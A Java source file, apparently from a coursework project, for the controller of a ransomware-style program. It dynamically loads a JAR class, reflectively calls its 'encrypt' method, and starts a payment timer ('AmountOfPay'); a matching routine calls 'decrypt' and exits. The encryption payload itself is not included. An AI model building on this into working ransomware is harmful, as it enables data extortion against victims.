package S01;

import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CryptoManager {
    private static Timer timerTask;
    private static ExecutorService executor;

    @SuppressWarnings("unchecked")
    public static void startEncrypting(){

        Object port = null;
        Method launchMethod = null;

        try{
            Object instance;
            URL[] urls = {new File(Configuration.instance.subFolderPathOfJavaArchive).toURI().toURL()};
            URLClassLoader urlClassLoader = new URLClassLoader(urls, CryptoManager.class.getClassLoader());
            Class clazz = Class.forName(Configuration.instance.nameOfClass, true, urlClassLoader);
            instance = clazz.getMethod("getInstance").invoke(null);
            port = clazz.getDeclaredField("port").get(instance);
            launchMethod = port.getClass().getMethod("encrypt");
            launchMethod.invoke(port);

            executor = Executors.newFixedThreadPool(1); //Thread Starten
            timerTask = new Timer(Configuration.instance.AmountOfPay);
            executor.execute(timerTask);

        }catch (Exception e){
            e.printStackTrace();
        }

    }


    @SuppressWarnings("unchecked")
    public static void startDecrypting(){

        Object port = null;
        Method launchMethod = null;

        try{
            Object instance;
            URL[] urls = {new File(Configuration.instance.subFolderPathOfJavaArchive).toURI().toURL()};
            URLClassLoader urlClassLoader = new URLClassLoader(urls, CryptoManager.class.getClassLoader());
            Class clazz = Class.forName(Configuration.instance.nameOfClass, true, urlClassLoader);
            instance = clazz.getMethod("getInstance").invoke(null);
            port = clazz.getDeclaredField("port").get(instance);
            launchMethod = port.getClass().getMethod("decrypt");
            launchMethod.invoke(port);



             //Beende Thread
            System.out.println("----------- Program Exited -----------");
            System.exit(0);

        }catch (Exception e){
            e.printStackTrace();
        }
    }


    public static Timer getTimerTask(){
        return timerTask;
    }



}
